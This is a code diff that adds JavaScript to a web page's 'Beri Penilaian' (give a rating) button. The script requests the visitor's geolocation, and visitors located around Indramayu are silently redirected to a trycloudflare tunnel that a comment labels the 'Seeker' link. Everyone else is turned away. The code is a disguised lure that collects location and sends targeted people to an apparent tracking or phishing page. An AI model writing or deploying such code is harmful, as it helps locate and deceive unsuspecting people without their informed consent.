@@ -40,3 +40,33 @@
   <div class="rating-box">
     <button onclick="cekLokasi()">Beri Penilaian</button>
   </div>
+  <script>
+    function cekLokasi() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(success, error);
+      } else {
+        alert("Browser Anda tidak mendukung akses lokasi.");
+      }
+    }
+
+    function success(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      // Cek apakah di sekitar Indramayu (± 10 km dari pusat kota)
+      if (lat >= -6.45 && lat <= -6.25 && lon >= 108.2 && lon <= 108.5) {
+        // ✅ Lokasi valid, redirect ke link Seeker
+        window.location.href = "https://ware-awesome-spent-parental.trycloudflare.com";
+      } else {
+        alert("Maaf, layanan ini hanya tersedia untuk pengunjung di area Indramayu.");
+        window.location.href = "https://www.google.com";
+      }
+    }
+
+    function error(err) {
+      alert("Gagal mengakses lokasi. Pastikan Anda mengizinkan akses lokasi.");
+    }
+  </script>
+</body>
+</html>
+
